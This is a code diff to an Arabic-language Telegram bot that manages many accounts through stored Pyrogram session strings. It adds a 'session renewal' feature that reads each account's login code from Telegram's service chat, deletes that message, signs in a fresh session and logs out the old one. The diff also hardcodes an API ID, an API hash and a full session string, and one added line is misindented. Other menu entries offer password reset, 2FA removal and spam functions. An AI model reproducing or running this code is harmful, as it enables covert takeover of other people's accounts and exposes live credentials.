@@ -61,12 +61,9 @@ except ImportError:
 except BaseException:
     OPENTELE_AVAILABLE = False
 
-import os
-
-API_ID = int(os.environ.get("API_ID"))
-API_HASH = os.environ.get("API_HASH")
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-
+API_ID = 28797361
+API_HASH = "771041b32e83ab232e066b7adeee700b" 
+BOT_TOKEN = ""
 
 ADMIN_IDS = [445421092, 6114298715, 8516187605, 936283959]
 LOG_CHANNEL = "@I_HATE_YOO"
@@ -2095,6 +2092,158 @@ async def monitor_and_leave(admin_id, target_username, golden_groups):
 
 
 
+#داله تجديد الجلسات
+
+
+
+
+# =========================================================
+# ♻️ مـيـزة تـجـديـد الـجـلـسـات (Session Renewal) الـذكـيـة
+# =========================================================
+
+@bot.callback_query_handler(func=lambda call: call.data == "menu_renew_manage")
+def renew_manage_menu(call):
+    if not is_allowed(call.from_user.id): return
+    bot.edit_message_text(
+        "🛂┊ **تـجـديـد الـجـلـسـات (Session Renewal):**\n\n"
+        "⎉╎ هـذه الـمـيـزة تـقـوم بـإنـشـاء جـلـسـة جـديـدة بـالـكـامـل،\n"
+        "⎉╎ وتـسـحـب الـكـود مـن الـجـلـسـة الـقـديـمـة وتـسـجـل دخـولـهـا،\n"
+        "⎉╎ ثـم تـقـوم بـتـسـجـيـل الـخـروج مـن الـقـديـمـة لـلأمـان.\n\n"
+        "⎉╎ اخـتـر الـحـسـابـات לـبـدء الـتـجـديـد:",
+        call.message.chat.id, call.message.message_id,
+        reply_markup=accounts_action_keyboard(call.from_user.id, "renew"),
+        parse_mode="Markdown"
+    )
+
+async def renew_single_session(acc_id, phone, name, pyro_session):
+    """المحرك الفعلي لتجديد الجلسة يعمل بالتوازي"""
+    async with account_semaphore: # تقييد 50 اتصال بنفس الوقت
+        # إنشاء الجلستين (القديمة والجديدة)
+        client_a = Client(f"old_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
+        # الجلسة الجديدة نضع لها اسم جهاز مختلف لتمييزها
+        client_b = Client(f"new_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, in_memory=True, device_model=f"Secured_V2_{acc_id}")
+
+        try:
+            await asyncio.wait_for(client_a.connect(), timeout=10)
+            await client_b.connect()
+
+            # 1. إرسال الكود للجلسة الجديدة B
+            sent_code = await client_b.send_code(phone)
+            await asyncio.sleep(2) # انتظار وصول الكود
+
+            # 2. اعتراض الكود بواسطة الجلسة A
+            login_code = None
+            msg_to_delete = None
+            for _ in range(4): # 4 محاولات للبحث عن الكود
+                async for msg in client_a.get_chat_history(777000, limit=3):
+                    if msg.text and ("Login code" in msg.text or "كود الدخول" in msg.text or "تسجيل الدخول" in msg.text):
+                        match = re.search(r'\b(\d{5})\b', msg.text)
+                        if match:
+                            login_code = match.group(1)
+                            msg_to_delete = msg
+                            break
+                if login_code: break
+                await asyncio.sleep(1.5)
+
+            if not login_code:
+                return False, f"❌ `{phone}`: لـم يـصـل كـود تـلـيـجـرام فـي الـمـحـادثـة (777000)."
+
+            # 3. حذف رسالة الكود فوراً من الحساب
+            if msg_to_delete:
+                try: await client_a.delete_messages(777000, msg_to_delete.id)
+                except: pass
+
+            # 4. تسجيل الدخول بالجلسة الجديدة B
+            try:
+                await client_b.sign_in(phone, sent_code.phone_code_hash, login_code)
+            except SessionPasswordNeeded:
+                return False, f"⚠️ `{phone}`: يـوجـد تـحـقـق بـخـطـوتـيـن! الـتـجـديـد يـتـطـلـب إزالـتـه أولاً."
+            except Exception as e:
+                return False, f"❌ `{phone}`: فـشـل تـسـجـيـل الـدخـول - `{str(e)[:40]}`"
+
+            # 5. الفحص والتأكد من الضوء الأخضر
+            me = await client_b.get_me()
+            if not me:
+                return False, f"❌ `{phone}`: فـشـل الـتـحـقـق مـن الـجـلـسـة الـجـديـدة."
+                
+            new_session_str = await client_b.export_session_string()
+
+            # 6. الانتحار (تسجيل خروج الجلسة A القديمة)
+            try:
+                await client_a.invoke(functions.auth.LogOut())
+            except: pass
+
+            # 7. تحديث قاعدة البيانات (متوافق مع عرض الجلسات الخيار الأول)
+            conn = get_db_conn()
+            c = conn.cursor()
+            c.execute("UPDATE sessions SET pyro_session=?, session_type='String' WHERE id=?", (new_session_str, acc_id))
+            conn.commit()
+            conn.close()
+
+            # رسالة النجاح التي ستقذف للمستخدم
+            success_msg = (
+                f"✅ **تـم تـجـديـد الـجـلـسـة وتـأمـيـنـهـا!**\n\n"
+                f"⎉╎ الاسـم: {name}\n"
+                f"⎉╎ الـرقـم: `{phone}`\n\n"
+                f"🔒 **سـيـشـن الـجـلـسـة الـجـديـدة:**\n`{new_session_str}`"
+            )
+            return True, success_msg
+
+        except Exception as e:
+            err_str = str(e)
+            if "flood" in err_str.lower() or "fresh" in err_str.lower():
+                return False, f"⚠️ `{phone}`: الحساب محظور مؤقتاً من طلب الأكواد (FloodWait)."
+            return False, f"❌ `{phone}`: خطأ أثـنـاء الـتـجـديـد - `{err_str[:40]}`"
+        finally:
+            if client_a.is_connected: await client_a.disconnect()
+            if client_b.is_connected: await client_b.disconnect()
+
+async def execute_renew_all_async(owner_id, chat_id, msg_id, target="all"):
+    """دالة تجميع المهام وقذفها للشاشة"""
+    accounts = get_all_accounts(owner_id)
+    if target != "all":
+        accounts = [acc for acc in accounts if str(acc[0]) == target]
+
+    if not accounts:
+        bot.edit_message_text("❌ لا تـوجـد حـسـابـات لـلـعـمـل عـلـيـهـا.", chat_id, msg_id)
+        return
+
+    # رسالة الانتظار
+    bot.edit_message_text(f"⏳ **جـاري تـجـديـد وتـأمـيـن {len(accounts)} حـسـابـات بـ 50 اتـصـال مـتـوازي...**", chat_id, msg_id, parse_mode="Markdown")
+
+    # تشغيل كل الحسابات
+    tasks = [renew_single_session(acc[0], acc[1], acc[2], acc[4]) for acc in accounts]
+    results = await asyncio.gather(*tasks)
+
+    failed_msgs = []
+    success_count = 0
+
+    # قذف الجلسات الجديدة كل واحدة برسالة منفصلة
+    for success, text in results:
+        if success:
+            success_count += 1
+            try:
+                bot.send_message(chat_id, text, parse_mode="Markdown")
+                await asyncio.sleep(0.3) # وقت راحة لتجنب حظر رسائل تليجرام
+            except: pass
+        else:
+            failed_msgs.append(text)
+
+    # تقرير ختامي للمهمة
+    summary = f"🏁 **انـتـهـت عـمـلـيـة تـجـديـد الـجـلـسـات!**\n\n✅ الـنـجـاح: `{success_count}`\n❌ الـفـشـل: `{len(failed_msgs)}`\n\n"
+    
+    # دمج رسائل الفشل إن وجدت
+    if failed_msgs:
+        summary += "**تـفـاصـيـل الأخـطـاء:**\n" + "\n".join(failed_msgs[:20])
+        if len(failed_msgs) > 20: summary += "\n... والمزيد."
+
+    bot.send_message(chat_id, summary, reply_markup=home_keyboard(owner_id), parse_mode="Markdown")
+
+
+
+
+
+
 
 # =========================================================
 # 🧠 الدوال الذكية والمحركات المعقدة
@@ -2457,6 +2606,7 @@ def home_keyboard(uid):
     markup.row(InlineKeyboardButton("• إدارة الإزالـة الـتـلـقـائـيـة ⏱️", callback_data="autoterm_manage"))
     markup.row(InlineKeyboardButton("• إدارة الـريـسـت والـقـفـل 🔒", callback_data="menu_pass_reset_manage"))
     markup.row(InlineKeyboardButton("• إدارة الـسـبـام بـلـوك 🚫", callback_data="spam_manage"))
+markup.row(InlineKeyboardButton("• تـجـديـد الـجـلـسـات ♻️", callback_data="menu_renew_manage"))
     markup.row(InlineKeyboardButton("• نـظـام الإحـالات 🇺🇲", callback_data="referral_menu"))
     
 
@@ -3342,7 +3492,7 @@ from pyrogram.raw.types import EmailVerifyPurposeLoginSetup, EmailVerificationCo
 from pyrogram.errors import FloodWait, RPCError
 
 # متغيرات النظام
-DEFAULT_TEMP_MAIL_SESSION = "BAG3abEApn9HAeUDClfSg0Yr3ayAz-xleU2bL19tQq3hpCHKUSUXxhMa7pwhyVQ2-puKcgL9gZmOfBJDblYBeGmf1Gx1cVT2dFmdlc264OLbPYTNilnPpBXgLthMNjfaeCSqUkzJZhTYMWCMKSwivuO7WqZ7X9l_REJMSDQKRfVgyucr2QOKpm2MWjI9SM9FMcbV_CY1Pmq7S9OiFM4a7gt0JMyG_cwZumiCJwfYV1y7lCjaYqDNYN8vU8nv5To8X2u5LzGqi2ssMhWjWoOT5E4jqgH8RPy9_e6W2VRMQStebxoziBOc_XNvJjagZIAjulB445efkGDPFanhiiIcmq3LPpNGVQAAAAAAAAAAAA"
+DEFAULT_TEMP_MAIL_SESSION = "AgAHll9v5tYKT2k6n2mZD1O63aYm7wDGHMFoARfRybewsPRcqB9i13mhr+adJg71Qb0u9Cy27d/LyEQWruSvW+/ueDUEXYkFqkfRHb5s1odJp7Wswbc5Np9ZpyoWqW8Xvsurb+5R+Z1B1oq1Whk4sc3lo1N1rx3a84f/xSFr/3D6qjHb1g04JbCHH1BwmfG8MDeGriubUFel7guQvXzKUqCgefdyWG+N0LerPzBtbCLeeXKrqJPlspLiNUkasApggpzRd2vlBeSmuvKN5+QDosJAGn7Kjgi42Ajd/G6v/M8fgIkZReDJPvu9yW17u/ZjHGnEJvJQ7iG+TQiY8EOsMcyfAAAAAAAAAAAA"
 
 # تخزين العمال المختارين لكل مستخدم (في الذاكرة المؤقتة)
 USER_WORKERS = {}
@@ -4675,6 +4825,11 @@ def execute_action(call):
     parts = call.data.split(":")
     action = parts[1]
     target = parts[2]
+    if action == "renew":
+        bot.answer_callback_query(call.id, "⏳ جاري بدء عملية التجديد المتوازية...")
+        status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري تـجـهـيـز الـجـلـسـات...", parse_mode="Markdown")
+        run_async(execute_renew_all_async(call.from_user.id, status_msg.chat.id, status_msg.message_id, target))
+        return
 
     if action in ["2fa_remove", "2fa_change"]:
         USER_STATES[call.from_user.id] = {"action": action, "target": target}
